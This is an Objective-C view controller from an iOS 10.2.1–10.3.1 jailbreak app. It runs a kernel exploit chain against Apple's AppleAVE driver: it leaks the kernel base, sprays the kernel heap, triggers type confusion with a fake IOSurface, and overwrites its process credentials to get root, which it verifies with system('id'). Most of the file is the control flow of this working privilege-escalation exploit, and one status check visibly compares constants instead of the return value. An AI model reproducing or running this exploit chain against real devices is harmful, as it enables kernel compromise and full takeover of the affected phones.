//
//  ViewController.m
//  yalu102
//
//  Created by qwertyoruiop on 05/01/2017.
//  Copyright © 2017 kimjongcracks. All rights reserved.
//

#import "offsets.h"
#import "ViewController.h"
#include "log.h"
#include "kernel_read.h"
#include "apple_ave_pwn.h"
#include "offsets.h"
#include "heap_spray.h"
//#include "dbg.h"
#include "iosurface_utils.h"
#include "rwx.h"
#include "post_exploit.h"
#include "sploit.h"
#include "drop_payload.h"

#include <CoreFoundation/CoreFoundation.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>


#define KERNEL_MAGIC 							(0xfeedfacf)
static
void print_welcome_message() {
    logMsg("Hello Cheeki Breeki IV DAMKE.\nLet's jailbreak iOS 10.2.1 - 10.3.1.\n");
    logMsg("Credit goes to: ");
    logMsg("- Adam Donenfeld (@doadam) for heap info leak, kernel base leak, type confusion vuln and exploit.");
    logMsg("- Ian Beer for his great Tri Poloski eploit (Tripple fetch)");
    logMsg("- Mila432 for finding most offsets needed for the exploit.");
    logMsg("- Jakeashacks for helping with the project.");
    logMsg("- Boris Slav (life of Boris) for learning me how to brew kvass.");
    logMsg("- Vladimir Putin for being a b0ss.");
    logMsg("");
    logMsg("Created by: Sem Voigtlander on behalve of Coffeebreakerz.\n");
}



/*
 * Function name: 	initialize_iokit_connections
 * Description:		Creates all the necessary IOKit objects for the exploitation.
 * Returns:			kern_return_t.
 */

static
kern_return_t initialize_iokit_connections() {

    kern_return_t ret = KERN_SUCCESS;

    ret = apple_ave_pwn_init();
    if (KERN_SUCCESS != ret)
    {
        logMsg("Error initializing AppleAVE pwn");
        goto cleanup;
    }

    ret = kernel_read_init();
    if (KERN_SUCCESS != ret)
    {
        logMsg("Error initializing kernel read");
        goto cleanup;
    }

cleanup:
    if (KERN_SUCCESS != ret)
    {
        kernel_read_cleanup();
        apple_ave_pwn_cleanup();
    }
    return ret;
}


/*
 * Function name: 	cleanup_iokit
 * Description:		Cleans up IOKit resources.
 * Returns:			kern_return_t.
 */

static
kern_return_t cleanup_iokit() {

    kern_return_t ret = KERN_SUCCESS;
    kernel_read_cleanup();
    apple_ave_pwn_cleanup();

    return ret;
}


/*
 * Function name: 	test_rw_and_get_root
 * Description:		Tests our RW capabilities, then overwrites our credentials so we are root.
 * Returns:			kern_return_t.
 */

static
kern_return_t test_rw_and_get_root() {

    kern_return_t ret = KERN_SUCCESS;
    uint64_t kernel_magic = 0;

    ret = rwx_read(offsets_get_kernel_base(), &kernel_magic, 4);
    if (KERN_SUCCESS != ret || KERNEL_MAGIC != kernel_magic)
    {
        logMsg("error reading kernel magic");
        if (KERN_SUCCESS == ret)
        {
            ret = KERN_FAILURE;
        }
        goto cleanup;
    } else {
        DEBUG_LOG("kernel magic: %x", (uint32_t)kernel_magic);
    }

    ret = post_exploit_get_kernel_creds();
    if (KERN_SUCCESS != ret || getuid())
    {
        logMsg("error getting root");
        if (KERN_SUCCESS == ret)
        {
            ret = KERN_NO_ACCESS;
        }
        goto cleanup;
    }

cleanup:
    return ret;
}



static char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);

    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);

    return path;
}

NSArray* getBundlePocs() {
    DIR *dp;
    struct dirent *ep;

    char* in_path = NULL;
    char* bundle_root = bundle_path();
    asprintf(&in_path, "%s/pocs/", bundle_root);

    NSMutableArray* arr = [NSMutableArray array];

    dp = opendir(in_path);
    if (dp == NULL) {
        printf("unable to open pocs directory: %s\n", in_path);
        return NULL;
    }

    while ((ep = readdir(dp))) {
        if (ep->d_type != DT_REG) {
            continue;
        }
        char* entry = ep->d_name;
        [arr addObject:[NSString stringWithCString:entry encoding:NSASCIIStringEncoding]];

    }
    closedir(dp);
    free(bundle_root);

    return arr;
}


@interface ViewController()

- (IBAction)kys:(id)sender;

@end

id vc;
NSArray* bundle_pocs;

@implementation ViewController

- (void)viewDidLoad{
    [super viewDidLoad];
    vc = self;
    print_welcome_message();
    // get the list of poc binaries:
    bundle_pocs = getBundlePocs();

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(void){
        dispatch_async(dispatch_get_main_queue(), ^{

            self.kys.enabled = true;

        });
    });


}

- (void)logMsg:(NSString*)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        printf("%s\n", [msg UTF8String]);
    });
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


- (void)dealloc {
    [_kys release];
    [super dealloc];
}
- (IBAction)kys:(id)sender {
    dispatch_async(dispatch_get_main_queue(),^{
        int success = do_exploit();
        if(success == 0) {
            kern_return_t ret = KERN_SUCCESS;
            void * kernel_base = NULL;
            void * kernel_spray_address = NULL;

            system("id");

            ret = offsets_init();
            if (KERN_SUCCESS != ret)
            {
                logMsg("Error initializing offsets for current device.");
                goto cleanup;
            }

            ret = initialize_iokit_connections();
            if (KERN_SUCCESS != ret)
            {
                logMsg("Error initializing IOKit connections!");
                goto cleanup;
            }

            ret = heap_spray_init();
            if (KERN_SUCCESS != ret)
            {
                logMsg("Error initializing heap spray");
                goto cleanup;
            }

            ret = kernel_read_leak_kernel_base(&kernel_base);
            if (KERN_SUCCESS != ret)
            {
                logMsg("Error leaking kernel base.");
                goto cleanup;
            }
            NSString *kernel_base_log = [NSString stringWithFormat:@"Kernel base: %p", kernel_base];
            logMsg((char*)[kernel_base_log UTF8String]);
            offsets_set_kernel_base(kernel_base);

            ret = heap_spray_start_spraying(&kernel_spray_address);
            if (KERN_SUCCESS != ret)
            {
                logMsg("Error spraying heap.");
                goto cleanup;
            }

            ret = apple_ave_pwn_use_fake_iosurface(kernel_spray_address);
            if (KERN_SUCCESS != kIOReturnError)
            {
                logMsg("Error using fake IOSurface... we should be dead by here.");
            } else {
                logMsg("We're still alive and the fake surface was used");
            }

            ret = test_rw_and_get_root();
            if (KERN_SUCCESS != ret)
            {
                logMsg("error getting root.");
                goto cleanup;
            }

            system("id");
        cleanup:
            cleanup_iokit();
            heap_spray_cleanup();
        }
    });
}

@end
void logMsg(char* msg) {
    printf("%s\n", msg);
}

